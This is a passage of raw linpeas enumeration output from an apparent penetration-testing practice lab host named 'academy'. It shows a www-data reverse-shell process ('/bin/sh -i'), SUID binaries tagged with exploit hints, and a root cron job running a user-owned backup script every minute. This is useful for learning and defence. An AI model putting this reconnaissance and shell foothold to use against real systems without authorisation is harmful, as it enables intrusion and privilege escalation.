/lib/systemd/systemd-udevdsystemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncdroot       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -froot       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logindmessage+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyroot       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONEroot       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.confroot       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -Droot       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k startmysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqldwww-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k startroot       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --userroot       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bashroot       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclientroot      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclientwww-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -iwww-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -iwww-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.shwww-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux[+] Binary processes permissions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                       56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                          0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd[+] Cron jobs[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 -rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          /etc/cron.d:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rw-r--r--  1 root root  712 Dec 17  2018 php/etc/cron.daily:total 40drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.weekly:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  813 Feb 10  2019 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * /home/grimmie/backup.sh[+] Services[i] Search for outdated versions                                                                                                                                [ - ]  apache-htcacheclean                                                                                                                                     [ + ]  apache2 [ + ]  apparmor [ - ]  console-setup.sh [ + ]  cron [ + ]  dbus [ - ]  hwclock.sh [ - ]  keyboard-setup.sh [ + ]  kmod [ + ]  mysql [ + ]  networking [ + ]  procps [ - ]  rsync [ + ]  rsyslog [ + ]  ssh [ + ]  udev [ + ]  vsftpd===================================( Network Information )====================================[+] Hostname, hosts and DNS                                                                                                                                    academy                                                                                                                                                        127.0.0.1       localhost127.0.1.1       academy.tcm.sec academy::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersdomain localdomainsearch localdomainnameserver 172.16.2.2tcm.sec[+] Content of /etc/inetd.conf/etc/inetd.conf Not Found                                                                                                                                                                                                                                                                                                     [+] Networks and neighboursdefault         0.0.0.0                                                                                                                                        loopback        127.0.0.0link-local      169.254.0.01: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33       valid_lft 1638sec preferred_lft 1638sec    inet6 fe80::20c:29ff:fea6:6e61/64 scope link        valid_lft forever preferred_lft forever172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE[+] Iptables rulesiptables rules Not Found                                                                                                                                                                                                                                                                                                      [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                                                                                                                           [+] Can I sniff with tcpdump?No                                                                                                                                                                                                                                                                                                                            ====================================( Users Information )=====================================[+] My user                                                                                                                                                    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          [+] Do I have PGP keys?gpg Not Found                                                                                                                                                                                                                                                                                                                 [+] Clipboard or highlighted text?xsel and xclip Not Found                                                                                                                                                                                                                                                                                                      [+] Testing 'sudo -l' without password & /etc/sudoers[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                                                                                                                                          [+] Checking /etc/doas.conf/etc/doas.conf Not Found                                                                                                                                                                                                                                                                                                      [+] Checking Pkexec policy                                                                                                                                                               [+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                                                                                                                                             [+] Superusersroot:x:0:0:root:/root:/bin/bash                                                                                                                                [+] Users with consolegrimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   root:x:0:0:root:/root:/bin/bash[+] Login information 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                10:18   29:42   0.04s  0.01s -bashroot     tty1                          Sat May 29 13:31 - down   (00:12)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)root     tty1                          Sat May 29 13:16 - down   (00:11)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)administ tty1                          Sat May 29 13:06 - down   (00:08)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)wtmp begins Sat May 29 13:05:58 2021[+] All users_apt                                                                                                                                                           backupbindaemonftpgamesgnatsgrimmieirclistlpmailmanmessagebusmysqlnewsnobodyproxyrootsshdsyncsyssystemd-coredumpsystemd-networksystemd-resolvesystemd-timesyncuucpwww-data[+] Password policyPASS_MAX_DAYS   99999                                                                                                                                          PASS_MIN_DAYS   0PASS_WARN_AGE   7ENCRYPT_METHOD SHA512===================================( Software Information )===================================[+] MySQL version                                                                                                                                              mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      [+] MySQL connection using default root/root ........... No[+] MySQL connection using root/toor ................... No                                                                                                    [+] MySQL connection using root/NOPASS ................. No                                                                                                    [+] Looking for mysql credentials and exec                                                                                                                     From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     Found readable /etc/mysql/my.cnf[client-server]!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/[+] PostgreSQL version and pgadmin credentials Not Found                                                                                                                                                                                                                                                                                                                    [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                                                                                                                                      [+] Apache server infoVersion: Server version: Apache/2.4.38 (Debian)                                                                                                                Server built:   2020-08-25T20:08:29[+] Looking for PHPCookies Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Wordpress wp-config.php fileswp-config.php Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for Tomcat users filetomcat-users.xml Not Found                                                                                                                                                                                                                                                                                                    [+] Mongo information Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for supervisord configuration filesupervisord.conf Not Found                                                                                                                                                                                                                                                                                                    [+] Looking for cesi configuration filecesi.conf Not Found                                                                                                                                                                                                                                                                                                           [+] Looking for Rsyncd config file/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      [ftp]        comment = public archive        path = /var/www/pub        use chroot = yes        lock file = /var/lock/rsyncd        read only = yes        list = yes        uid = nobody        gid = nogroup        strict modes = yes        ignore errors = no        ignore nonreadable = yes        transfer logging = no        timeout = 600        refuse options = checksum dry-run        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz[+] Looking for Hostapd config filehostapd.conf Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for wifi conns file Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Anaconda-ks config filesanaconda-ks.cfg Not Found                                                                                                                                                                                                                                                                                                     [+] Looking for .vnc directories and their passwd files.vnc Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for ldap directories and their hashes/etc/ldap                                                                                                                                                      The password hash is from the {SSHA} to 'structural'[+] Looking for .ovpn files and credentials.ovpn Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for ssl/ssh filesPermitRootLogin yes                                                                                                                                            ChallengeResponseAuthentication noUsePAM yesLooking inside /etc/ssh/ssh_config for interesting infoHost *    SendEnv LANG LC_*    HashKnownHosts yes    GSSAPIAuthentication yes[+] Looking for unexpected auth lines in /etc/pam.d/sshdNo                                                                                                                                                                                                                                                                                                                            [+] Looking for Cloud credentials (AWS, Azure, GC)                                                                                                                                                               [+] NFS exports?[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         /etc/exports Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for kerberos conf files and tickets[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          krb5.conf Not Found                                                                                                                                            tickets kerberos Not Found                                                                                                                                     klist Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for Kibana yamlkibana.yml Not Found                                                                                                                                                                                                                                                                                                          [+] Looking for logstash files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for elasticsearch files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Vault-ssh filesvault-ssh-helper.hcl Not Found                                                                                                                                                                                                                                                                                                [+] Looking for AD cached hahsescached hashes Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for screen sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            screen Not Found                                                                                                                                                                                                                                                                                                              [+] Looking for tmux sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            tmux Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for Couchdb directory                                                                                                                                                               [+] Looking for redis.conf                                                                                                                                                               [+] Looking for dovecot filesdovecot credentials Not Found                                                                                                                                                                                                                                                                                                 [+] Looking for mosquitto.conf                                                                                                                                                               ====================================( Interesting Files )=====================================[+] SUID                                                                                                                                                       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    /usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chfn           --->    SuSE_9.3/10/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/usr/bin/newgrp         --->    HP-UX_10.20/usr/bin/umount         --->    BSD/Linux[1996-08-13]/usr/bin/chsh/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM/usr/bin/su/usr/bin/gpasswd[+] SGID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/sbin/unix_chkpwd                                                                                                                                          /usr/bin/bsd-write/usr/bin/expiry/usr/bin/wall/usr/bin/crontab/usr/bin/dotlockfile/usr/bin/chage/usr/bin/ssh-agent[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   /usr/bin/ping = cap_net_raw+ep                                                                                                                                 [+] .sh files in path/usr/bin/gettext.sh                                                                                                                                            [+] Files (scripts) in /etc/profile.d/total 20                                                                                                                                                       drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh[+] Hashes inside passwd file? ........... No[+] Can I read shadow files? ........... No                                                                                                                    [+] Can I read root folder? ........... No                                                                                                                                                                                                                                                                                    [+] Looking for root files in home dirs (limit 20)/home                                                                                                                                                          [+] Looking for root files in folders owned by me                                                                                                                                                               [+] Readable files belonging to root and readable by me but not world readable                                                                                                                                                               [+] Files inside /home/www-data (limit 20)                                                                                                                                                               [+] Files inside others home (limit 20)/home/grimmie/.bash_history                                                                                                                                    /home/grimmie/.bashrc/home/grimmie/backup.sh/home/grimmie/.profile/home/grimmie/.bash_logout[+] Looking for installed mail applications                                                                                                                                                               [+] Mails (limit 50)                                                                                                                                                               [+] Backup files?-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    -rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup[+] Looking for tables inside readable .db/.sqlite files (limit 100)                                                                                                                                                               [+] Web files?(output limit)/var/www/:                                                                                                                                                     total 12Kdrwxr-xr-x  3 root root 4.0K May 29  2021 .drwxr-xr-x 12 root root 4.0K May 29  2021 ..drwxr-xr-x  3 root root 4.0K May 29  2021 html/var/www/html:total 24Kdrwxr-xr-x 3 root     root     4.0K May 29  2021 .drwxr-xr-x 3 root     root     4.0K May 29  2021 ..[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            -rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      -rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                           270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             -rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0[+] Interesting writable Files[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 /dev/mqueue                                                                                                                                                    /dev/mqueue/linpeas.txt/dev/shm/run/lock/run/lock/apache2/sys/kernel/security/apparmor/.access/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/tmp/tmp/linpeas.sh/var/cache/apache2/mod_cache_disk/var/lib/php/sessions/var/lib/phpmyadmin/var/lib/phpmyadmin/tmp/var/lib/phpmyadmin/tmp/twig/var/lib/phpmyadmin/tmp/twig/15/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php/var/lib/phpmyadmin/tmp/twig/21/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php/var/lib/phpmyadmin/tmp/twig/22/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php/var/lib/phpmyadmin/tmp/twig/28/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php/var/lib/phpmyadmin/tmp/twig/2e/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php/var/lib/phpmyadmin/tmp/twig/31/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php/var/lib/phpmyadmin/tmp/twig/36/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php/var/lib/phpmyadmin/tmp/twig/3b/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php/var/lib/phpmyadmin/tmp/twig/41/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php/var/lib/phpmyadmin/tmp/twig/42/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php/var/lib/phpmyadmin/tmp/twig/43/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php/var/lib/phpmyadmin/tmp/twig/4c/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php/var/lib/phpmyadmin/tmp/twig/4e/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php/var/lib/phpmyadmin/tmp/twig/4f/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php/var/lib/phpmyadmin/tmp/twig/53/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php/var/lib/phpmyadmin/tmp/twig/5c/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php/var/lib/phpmyadmin/tmp/twig/61/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php/var/lib/phpmyadmin/tmp/twig/6b/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php/var/lib/phpmyadmin/tmp/twig/6c/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php/var/lib/phpmyadmin/tmp/twig/73/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php/var/lib/phpmyadmin/tmp/twig/78/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php/var/lib/phpmyadmin/tmp/twig/7d/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php/var/lib/phpmyadmin/tmp/twig/7f/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php/var/lib/phpmyadmin/tmp/twig/8a/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php/var/lib/phpmyadmin/tmp/twig/8b/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php/var/lib/phpmyadmin/tmp/twig/96/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php/var/lib/phpmyadmin/tmp/twig/97/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php/var/lib/phpmyadmin/tmp/twig/99/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php/var/lib/phpmyadmin/tmp/twig/9d/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php/var/lib/phpmyadmin/tmp/twig/9e/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php/var/lib/phpmyadmin/tmp/twig/a0/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php/var/lib/phpmyadmin/tmp/twig/a4/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php/var/lib/phpmyadmin/tmp/twig/a7/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php/var/lib/phpmyadmin/tmp/twig/ae/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php/var/lib/phpmyadmin/tmp/twig/af/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php/var/lib/phpmyadmin/tmp/twig/b6/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php/var/lib/phpmyadmin/tmp/twig/c3/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php/var/lib/phpmyadmin/tmp/twig/c5/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php/var/lib/phpmyadmin/tmp/twig/c7/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php/var/lib/phpmyadmin/tmp/twig/ca/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php/var/lib/phpmyadmin/tmp/twig/d6/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php/var/lib/phpmyadmin/tmp/twig/dd/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php/var/lib/phpmyadmin/tmp/twig/e8/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php/var/lib/phpmyadmin/tmp/tw